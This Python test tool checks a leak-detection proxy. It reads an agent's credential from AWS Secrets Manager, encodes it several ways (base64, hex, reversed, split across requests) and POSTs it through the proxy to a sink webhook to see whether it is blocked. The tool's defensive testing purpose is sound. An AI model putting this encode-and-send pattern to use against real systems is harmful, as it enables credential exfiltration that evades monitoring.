"""TEST TOOL: read a ledger credential privately and try a controlled outbound request."""
import base64
import json
import os
import re
import secrets
from urllib.parse import quote, urlsplit

import boto3
from boto3.dynamodb.conditions import Key
import httpx

from burn_contracts import names

ENCODINGS = ("plain", "base64", "hex", "url", "reversed", "spaced", "split_across_requests", "random")
_REASONS = {"session_required", "session_inactive", "private_destination", "destination_not_allowed",
            "destination_port_not_allowed", "credential_detected", "payload_too_large", "exit_check_unavailable"}


def encode(value: str, encoding: str) -> list[str]:
    if encoding == "plain":
        return [value]
    if encoding == "base64":
        return [base64.b64encode(value.encode()).decode()]
    if encoding == "hex":
        return [value.encode().hex()]
    if encoding == "url":
        return ["".join(f"%{byte:02X}" for byte in value.encode())]
    if encoding == "reversed":
        return [value[::-1]]
    if encoding == "spaced":
        return [" ".join(value)]
    if encoding == "split_across_requests":
        middle = len(value) // 2
        return [value[:middle], value[middle:]]
    raise ValueError("unsupported encoding")


def query_all(table, **kwargs) -> list[dict]:
    rows, page = [], {}
    while True:
        result = table.query(**kwargs, **page)
        rows.extend(result.get("Items", []))
        if not result.get("LastEvaluatedKey"):
            return rows
        page = {"ExclusiveStartKey": result["LastEvaluatedKey"]}


class LeakTest:
    def __init__(self, *, ddb=None, secrets_client=None, client_factory=httpx.Client):
        self.ddb = ddb or boto3.resource("dynamodb", region_name=names.REGION)
        self.secrets = secrets_client or boto3.client("secretsmanager", region_name=names.REGION)
        self.client_factory = client_factory
        self.sink = os.environ.get("BURN_SINK_URL", "http://sink:8081")
        self.proxy = os.environ.get("BURN_PROXY_URL", "http://localhost:8080")

    def ledger(self, agent: str) -> list[dict]:
        api = os.environ.get("BURN_API_URL")
        if api:
            with httpx.Client(trust_env=False, timeout=10) as client:
                response = client.get(api.rstrip("/") + f"/agents/{agent}/ledger",
                    headers={names.DEMO_TOKEN_HEADER: os.environ.get("BURN_DEMO_TOKEN", "")})
                response.raise_for_status()
                return response.json()["entries"]
        return query_all(self.ddb.Table(names.EXPOSURES_TABLE), KeyConditionExpression=Key("agent_id").eq(agent),
                         ConsistentRead=True)

    def current_session(self, agent: str) -> str:
        rows = query_all(self.ddb.Table(names.SESSIONS_TABLE), IndexName="by_agent",
                         KeyConditionExpression=Key("agent_id").eq(agent))
        active = [row for row in rows if row.get("status") == "active"]
        if not active:
            raise ValueError("no active session")
        return max(active, key=lambda row: str(row.get("created_at", row.get("ts", ""))))["session_id"]

    def value(self, ref: str) -> str:
        raw = self.secrets.get_secret_value(SecretId=ref)["SecretString"]
        if ref.endswith("/aws_key"):
            return json.loads(raw)["secret_access_key"]
        return raw

    def run(self, *, agent_id: str, secret_ref: str | None = None, encoding: str = "random",
            free_text: str | None = None) -> dict:
        if not names.is_agent_id(agent_id) or encoding not in ENCODINGS:
            raise ValueError("invalid test request")
        session = self.current_session(agent_id)
        if free_text is not None:
            selected, actual, payloads = None, "plain", [free_text]
        else:
            refs = {row.get("secret_ref") or row.get("secret_ref_or_fp") for row in self.ledger(agent_id)}
            refs = {ref for ref in refs if ref and re.fullmatch(r"burn/(?:agent-[a-z0-9-]{1,40}|shared)/[a-z0-9_]{1,40}", ref)}
            if not refs or secret_ref is not None and secret_ref not in refs:
                raise ValueError("credential unavailable in ledger")
            selected = secret_ref or secrets.choice(sorted(refs))
            actual = secrets.choice(ENCODINGS[:-1]) if encoding == "random" else encoding
            payloads = encode(self.value(selected), actual)
        proxy = urlsplit(self.proxy)
        authenticated = f"{proxy.scheme}://{quote(agent_id, safe='')}:{quote(session, safe='')}@{proxy.netloc}"
        result = {"blocked": False, "encoding": actual, "secret_ref": selected,
                  "destination": urlsplit(self.sink).hostname, "requests_sent": 0, "reason": None, "event_id": None}
        certificate = os.environ.get("BURN_PROXY_CA_CERT")
        with self.client_factory(proxy=authenticated, verify=certificate or True, trust_env=False, timeout=15) as client:
            for payload in payloads:
                response = client.post(self.sink.rstrip("/") + "/webhook", content=payload.encode(),
                                       headers={"Content-Type": "text/plain; charset=utf-8"})
                result["requests_sent"] += 1
                if response.status_code == 403:
                    result["blocked"] = True
                    try:
                        data = response.json()
                    except ValueError:
                        data = {}
                    reason = data.get("reason")
                    result["reason"] = reason if reason in _REASONS else "proxy_rejected"
                    event = data.get("event_id")
                    if isinstance(event, str) and re.fullmatch(r"evt_[0-9A-HJKMNP-TV-Z]{26}", event):
                        result["event_id"] = event
                    break
                response.raise_for_status()
        return result
